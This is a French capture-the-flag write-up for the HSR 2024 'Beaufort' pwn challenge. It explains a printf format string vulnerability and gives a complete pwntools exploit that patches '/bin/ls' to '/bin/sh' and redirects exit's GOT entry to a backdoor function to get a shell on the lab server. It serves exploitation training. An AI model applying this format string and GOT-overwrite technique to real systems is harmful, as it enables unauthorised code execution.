---
title: Chiffrement de Beaufort -  HSR 2024
date: 2024-04-01
draft: false
categories:
  - format string
  - HSR
  - pwn
tags:
  - pwn
  - format_string
  - HSR
  - writeups
---
## Binary Analysis
Pour analyser le binaire, on va commencer par l'ouvrir avec un décompilo, comme **Binja**. Le binaire n'étant pas strippé, on peut s'aider des symboles pour deviner ce que fait chaque fonction.
![Malloc from Top Chunk](/images/beaufort_symbols.png)

A part la fonction *backdoor()* qui aspire à servir de fonction *win()*, le nom des fonctions ne nous apporte rien d'intéressant.
Regardons un peu plus en détail ce que fait le programme.

### Main()
Tout d'abord, la fonction *main()* va lire l'entrée standard à 2 reprises, attendant de l'utilisateur qu'il envoie une chaine de maximum 0x64 caractères. Ensuite elle va stocker ces entrées dans 2 buffers, puis appeler la fonction *beaufortCipher()* avec ces 2 buffers en paramètres.
![Malloc from Top Chunk](/images/beaufort_main1.png)

### beaufortCipher()
Quant à la fonction *cipherBeaufort()*, comme son nom l'indique, elle applique un chiffrement de **Beaufort** sur notre première input. La clé utilisée pour chiffrer le buffer est enfait notre 2ème input.
![Malloc from Top Chunk](/images/beaufort_cipher.png)

### End of main()
Une fois que notre input a été chiffrée avec la clé qu'on donne au programme, la fonction *main()* affiche le buffer chiffré, puis la clé qu'on lui a donné.
Et c'est ici que se trouve la vuln. 

En effet, le *printf()* que le programme appel pour afficher notre clé prend directement la clé comme premier argument. Ainsi notre input (la clé) est interpetée, par *printf()*, comme étant le formatteur.
Le programme est donc vulnérable à une format string.

![Malloc from Top Chunk](/images/beaufort_main2.png)

## Theorycraft
Maintenant réfléchissons à comment on va exploiter la vuln. Si on fait un **checksec**, on remarque que le binaire n'a ni **PIE**, ni **RelRO**.
```sh title:checksec
Canary  :    ✘ 
NX      :    ✓ 
PIE     :    ✘ 
Fortify :    ✘ 
RelRO   :    Partial
```

Dans tous les cas on part du principe que **l'ASLR** est actif. De plus, comme le chall est en remote, on a pas les détails de l'environnement dans lequel run le binaire, donc c'est trop foireux de se baser sur des adresses hardcodées de la stack.

Par contre, l'abscence de **RelRO** et de **PIE** nous permet non seulement de localiser la **GOT** à coup sûr, mais aussi d'y accéder en écriture. On peut donc envisager d'overwrite certaines entrées de la GOT afin d'obtenir notre shell.

Enfin on a une fonction *backdoor()* qui lance un *system("/bin/ls")*. La string *"/bin/ls"* étant dans la section *.data*, on peut la changer pour *"/bin/sh"* avant de rediriger le flow d'execution vers *backdoor()*.
## Exploitation
Notre exploit va se faire en 3 étapes:
1) Trouver à quel offset notre input se trouve sur la stack, au moment du call à *printf()*
2) Overwrite *"/bin/ls"* avec *"/bin/sh"*
3) Overwrite l'entrée de *exit()* dans la **GOT** avec l'adresse de *backup()*

### Input offset
Pour trouver l'offset, tout ce qu'on a à faire est de lancer le programme, **break** au moment du *printf()* vulnérable et regarder à quelle distance de **$ESP** se trouve notre input. Pour repérer facilement notre input, on va envoyer *"aaaaaaa..."* comme clé.
![Malloc from Top Chunk](/images/beaufort_gdb.png)

On voit que notre input est à $0$x$78$ bytes de **$ESP**, soit en 32 bits, $30*4$ bytes. Notre offset est donc 30.

### The Exploit
Pour ce qui est de l'exploit, on va utiliser le module *fmtstr* de *Pwntools* et plus particulièrement la fonction *fmtstr_payload()*. Il nous suffit simplement de lui passer comme argument l'offset de notre input ainsi qu'un dictionnaire des adresses et des valeurs qu'on souhaite écrire.

```py
payload = fmtstr_payload(30, writes) 
print(payload)
```

L'adresse de *"/bin/ls"* est *0x0804c024*. On va donc écrire *"sh"* à *0x0804c029*, ce qui nous donnera *"/bin/sh"*.
Enfin on va réécrire l'entrée de *exit()* dans la **GOT** par l'adresse de la fonction *backup()*.

```py
writes = { 0x0804c029: 0x00006873, 
		   elfexe.got['exit']: elfexe.sym['backdoor']}
```

Ce qui donne comme exploit final :
```py title:exploit.py
#!/usr/bin/python3.9 
from pwn import * 

context.binary = elfexe = ELF('./beaufort.bin')

def start(argv=[], *a, **kw): 
	'''Start the exploit against the target.''' 
	elf_path = elfexe.path 
	
	if args.REMOTE: 
		remote_server = '10.22.148.11'
		remote_port = 1341
		target = remote(remote_server, remote_port) 
	else:  
		target = process([elf_path] + argv, *a, **kw) 
	
	return target 
		
#=========================================================== 
# EXPLOIT GOES HERE 
#=========================================================== 
def pad(payload): 
	return payload+b'_'*(0x64-len(payload)) 
	
arguments = [] 
io = start(arguments) 

writes = {0x0804c029: 0x00006873, 
		  elfexe.got['exit']: elfexe.sym['backdoor']} 

payload = b"A"*0x60 
io.sendline(payload) 

payload = fmtstr_payload(30, writes) 
payload = pad(payload) 

print(payload) 
io.sendline(payload) 

io.interactive()
io.close()
```
